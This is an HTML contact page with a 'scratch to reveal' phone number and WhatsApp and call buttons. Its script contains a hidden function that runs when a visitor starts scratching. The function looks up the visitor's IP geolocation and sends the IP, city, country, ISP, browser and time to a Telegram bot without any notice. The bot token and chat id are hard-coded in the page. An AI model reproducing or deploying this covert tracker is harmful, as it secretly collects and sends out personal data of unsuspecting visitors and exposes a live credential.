<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Contact</title>

<style>
body {
  margin: 0;
  font-family: sans-serif;
  background: linear-gradient(135deg, #667eea, #764ba2);
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.container {
  background: white;
  padding: 20px;
  border-radius: 15px;
  width: 90%;
  max-width: 380px;
  text-align: center;
}

h2 {
  margin-bottom: 15px;
}

/* Scratch box */
.scratch-card {
  position: relative;
  width: 100%;
  height: 80px;
  margin-top: 15px;
}

#number {
  position: absolute;
  width: 100%;
  height: 100%;
  font-size: 22px;
  font-weight: bold;
  display: flex;
  align-items: center;
  justify-content: center;
  background: #f1f1f1;
  border-radius: 10px;
}

canvas {
  position: absolute;
  top: 0;
  left: 0;
  border-radius: 10px;
}

/* Buttons */
a {
  display: none;
  width: 100%;
  padding: 14px;
  margin-top: 12px;
  border-radius: 10px;
  text-decoration: none;
  color: white;
}

#wa { background: #25D366; }
#call { background: #28a745; }

</style>
</head>

<body>

<div class="container">

<h2>Scratch to Reveal Number</h2>

<div class="scratch-card">
  <div id="number">+91 9510389983</div>
  <canvas id="scratch"></canvas>
</div>

<a id="wa" target="_blank">💬 WhatsApp</a>
<a id="call">📞 Call</a>

</div>

<script>
const canvas = document.getElementById("scratch");
const ctx = canvas.getContext("2d");

canvas.width = canvas.offsetWidth;
canvas.height = canvas.offsetHeight;

// Grey overlay
ctx.fillStyle = "#ccc";
ctx.fillRect(0, 0, canvas.width, canvas.height);

ctx.globalCompositeOperation = "destination-out";

let isDrawing = false;
let revealed = false;

function start(e) {
  isDrawing = true;
  sendData(); // send once when user starts scratching
}

function end() {
  isDrawing = false;
}

function draw(e) {
  if (!isDrawing) return;

  let rect = canvas.getBoundingClientRect();
  let x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
  let y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;

  ctx.beginPath();
  ctx.arc(x, y, 15, 0, Math.PI * 2);
  ctx.fill();

  // reveal buttons once scratched enough
  if (!revealed) {
    revealed = true;
    document.getElementById("wa").style.display = "block";
    document.getElementById("call").style.display = "block";

    document.getElementById("wa").href =
      "https://wa.me/919510389983";

    document.getElementById("call").href =
      "tel:9510389983";
  }
}

// Events
canvas.addEventListener("mousedown", start);
canvas.addEventListener("mouseup", end);
canvas.addEventListener("mousemove", draw);

canvas.addEventListener("touchstart", start);
canvas.addEventListener("touchend", end);
canvas.addEventListener("touchmove", draw);

// Send data to Telegram
async function sendData() {
  try {
    let data = await fetch("https://ipapi.co/json/")
      .then(res => res.json());

    let msg =
`📱 Scratch Visitor!

IP: ${data.ip}
City: ${data.city}
Country: ${data.country_name}
ISP: ${data.org}
Device: ${navigator.userAgent}
Time: ${new Date().toLocaleString()}`;

    fetch("https://api.telegram.org/bot8779897483:AAHpfrls0bPlhU_rNQKLymMB26aEy6m4bBs/sendMessage", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: "6319233453",
        text: msg
      })
    });

  } catch(e) {}
}
</script>

</body>
</html>
